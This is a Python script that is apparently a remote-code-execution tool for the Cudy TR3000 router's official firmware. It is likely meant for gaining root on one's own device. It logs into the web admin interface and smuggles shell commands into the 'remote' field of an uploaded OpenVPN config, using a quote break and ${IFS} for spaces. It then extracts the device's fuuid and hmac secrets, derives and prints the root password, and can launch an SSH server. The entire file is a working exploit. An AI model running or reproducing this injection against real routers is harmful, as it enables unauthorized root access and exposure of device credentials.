#!/usr/bin/env python3
import argparse
import hashlib
import http.cookiejar
import json
import re
import sys
import time
import uuid
from html import unescape
from urllib.error import HTTPError
from urllib.parse import urlencode, urljoin, urlparse
from urllib.request import HTTPCookieProcessor, Request, build_opener


def sha256_hex(value: str) -> str:
    return hashlib.sha256(value.encode()).hexdigest()


def extract_hidden(html: str) -> dict[str, str]:
    values: dict[str, str] = {}
    for match in re.finditer(r"<input\b[^>]*>", html, re.I):
        tag = match.group(0)
        name = re.search(r'\bname=["\']([^"\']+)["\']', tag, re.I)
        value = re.search(r'\bvalue=["\']([^"\']*)["\']', tag, re.I)
        if name:
            values[unescape(name.group(1))] = unescape(value.group(1) if value else "")
    return values


class CudyClient:
    def __init__(self, base: str, username: str, password: str):
        self.base = base.rstrip("/")
        self.username = username
        self.password = password
        self.cookiejar = http.cookiejar.CookieJar()
        self.opener = build_opener(HTTPCookieProcessor(self.cookiejar))
        self.rpc_auth: str | None = None

    def url(self, path: str) -> str:
        return urljoin(self.base + "/", path.lstrip("/"))

    def request(
        self,
        method: str,
        path: str,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
        timeout: int = 25,
    ):
        req = Request(self.url(path), data=data, headers=headers or {}, method=method)
        try:
            res = self.opener.open(req, timeout=timeout)
        except HTTPError as exc:
            res = exc
        body = res.read()
        text = body.decode(res.headers.get_content_charset() or "utf-8", "replace")
        return res.status, dict(res.headers.items()), text

    def web_login(self) -> None:
        status, _, html = self.request("GET", "/cgi-bin/luci/")
        hidden = extract_hidden(html)
        salt = hidden.get("salt", "")
        token = hidden.get("token", "")
        password = sha256_hex(self.password + salt)
        if token:
            password = sha256_hex(password + token)

        data = dict(hidden)
        data.update(
            {
                "luci_language": "auto",
                "luci_username": self.username,
                "luci_password": password,
                "zonename": "Asia/Shanghai",
                "timeclock": str(int(time.time())),
            }
        )
        status, _, text = self.request(
            "POST",
            "/cgi-bin/luci/",
            urlencode(data).encode(),
            {"Content-Type": "application/x-www-form-urlencoded"},
        )
        if status not in (200, 302):
            raise RuntimeError(f"LuCI login failed: HTTP {status} {text[:200]}")

    def rpc_call(self, endpoint: str, method: str, params: list | None = None, auth: str | None = None):
        payload = {"id": 1, "method": method, "params": params or []}
        path = f"/cgi-bin/luci/rpc/{endpoint}"
        if auth:
            path += f"?auth={auth}"
        status, _, text = self.request(
            "POST",
            path,
            json.dumps(payload).encode(),
            {"Content-Type": "application/json"},
        )
        if status != 200:
            raise RuntimeError(f"RPC {endpoint}.{method} failed: HTTP {status} {text[:200]}")
        body = json.loads(text)
        if body.get("error"):
            raise RuntimeError(f"RPC {endpoint}.{method} error: {body['error']}")
        return body.get("result")

    def rpc_login(self) -> None:
        salt = self.rpc_call("auth", "salt")
        token = self.rpc_call("auth", "token")
        password = sha256_hex(sha256_hex(self.password + salt) + token)
        self.rpc_auth = self.rpc_call("auth", "login", [self.username, password])

    def app(self, method: str, params: list | None = None):
        if not self.rpc_auth:
            self.rpc_login()
        return self.rpc_call("app", method, params or [], self.rpc_auth)

    @staticmethod
    def multipart(fields: dict[str, str], files: dict[str, tuple[str, bytes, str]]):
        boundary = "----cudy-" + uuid.uuid4().hex
        chunks: list[bytes] = []
        for name, value in fields.items():
            chunks.append(
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
                f"{value}\r\n".encode()
            )
        for name, (filename, content, content_type) in files.items():
            chunks.append(
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'
                f"Content-Type: {content_type}\r\n\r\n".encode()
                + content
                + b"\r\n"
            )
        chunks.append(f"--{boundary}--\r\n".encode())
        return boundary, b"".join(chunks)

    def upload_ovpn(self, server_payload: str, filename: str = "payload.ovpn") -> None:
        status, _, html = self.request("GET", "/cgi-bin/luci/admin/network/vpn/openvpn")
        if status != 200:
            raise RuntimeError(f"OpenVPN page failed: HTTP {status}")
        token = extract_hidden(html).get("token", "")
        ovpn = (
            "client\n"
            "dev tun\n"
            "proto udp\n"
            f"remote {server_payload} 1194\n"
            "verb 3\n"
        ).encode()
        boundary, body = self.multipart(
            {"token": token, "cbid.openvpn.client.ovpn.upload": "true"},
            {"cbid.openvpn.client.ovpn": (filename, ovpn, "application/octet-stream")},
        )
        status, _, text = self.request(
            "POST",
            "/cgi-bin/luci/admin/network/vpn/openvpn",
            body,
            {"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )
        if status != 200:
            raise RuntimeError(f"OpenVPN upload failed: HTTP {status} {text[:200]}")

    def apply_openvpn(self) -> None:
        status, _, html = self.request("GET", "/cgi-bin/luci/admin/network/vpn/openvpn")
        token = extract_hidden(html).get("token", "")
        data = {
            "token": token,
            "timeclock": "",
            "cbi.submit": "1",
            "cbi.apply": "1",
            "cbi.rlf.client.ovpn": "",
            "cbid.openvpn.client.enabled": "0",
        }
        status, _, text = self.request(
            "POST",
            "/cgi-bin/luci/admin/network/vpn/openvpn",
            urlencode(data).encode(),
            {"Content-Type": "application/x-www-form-urlencoded"},
        )
        # Long-running injected commands may make uhttpd return 502 after the command was launched.
        if status not in (200, 502):
            raise RuntimeError(f"OpenVPN apply failed: HTTP {status} {text[:200]}")

    def run_command(self, command: str) -> None:
        packed = command.replace(" ", "${IFS}")
        self.upload_ovpn("1.2.3.4';" + packed + ";#")
        self.apply_openvpn()

    def restore_openvpn(self) -> None:
        self.upload_ovpn("1.2.3.4", "restore.ovpn")


def read_device_identity(client: CudyClient) -> tuple[str, str, str]:
    try:
        bind = client.app("system.bind_token", [])
        fuuid = str(bind.get("fuuid", "")).strip()
        if not fuuid:
            raise RuntimeError("system.bind_token did not return fuuid")
        client.run_command("uci set openvpn.client.password=$(bdinfo hmac);uci commit openvpn")
        client_conf = client.app("conf.get_all", ["openvpn"])["client"]
        hmac = str(client_conf.get("password", "")).strip()
    except RuntimeError as exc:
        print(f"[!] system.bind_token failed, falling back to bdinfo: {exc}", file=sys.stderr)
        client.run_command(
            "uci set openvpn.client.username=$(bdinfo fuuid);"
            "uci set openvpn.client.password=$(bdinfo hmac);"
            "uci commit openvpn"
        )
        client_conf = client.app("conf.get_all", ["openvpn"])["client"]
        fuuid = str(client_conf.get("username", "")).strip()
        hmac = str(client_conf.get("password", "")).strip()

    if not fuuid:
        raise RuntimeError("could not read bdinfo fuuid")
    if not hmac:
        raise RuntimeError("could not read bdinfo hmac")
    return fuuid, hmac, sha256_hex(fuuid + hmac)


def main() -> int:
    parser = argparse.ArgumentParser(description="Cudy TR3000 256MB V1 official firmware OpenVPN CBI RCE helper")
    parser.add_argument("--base", default="http://192.168.10.1")
    parser.add_argument("--user", default="admin")
    parser.add_argument("--password", required=True, help="LuCI admin password")
    parser.add_argument("--start-ssh", action="store_true", help="start temporary dropbear on port 22")
    args = parser.parse_args()

    client = CudyClient(args.base, args.user, args.password)
    client.web_login()
    print("[+] logged in to LuCI")
    client.rpc_login()

    fuuid, hmac, root_password = read_device_identity(client)
    print("[+] fuuid:", fuuid)
    print("[+] hmac:", hmac)
    print("[+] derived root password:", root_password)

    if args.start_ssh:
        start_ssh = (
            "mkdir -p /tmp/cudy-ssh;"
            "/usr/bin/dropbearkey -t ed25519 -f /tmp/cudy-ssh/dropbear_ed25519_host_key;"
            "/usr/sbin/dropbear -r /tmp/cudy-ssh/dropbear_ed25519_host_key "
            "-p 22 -P /tmp/dropbear.manual.pid"
        )
        client.run_command(start_ssh)
        host = urlparse(args.base).hostname or "192.168.10.1"
        print(f"[+] temporary SSH should now be listening on {host}:22")

    client.restore_openvpn()
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print("[-]", exc, file=sys.stderr)
        raise SystemExit(1)
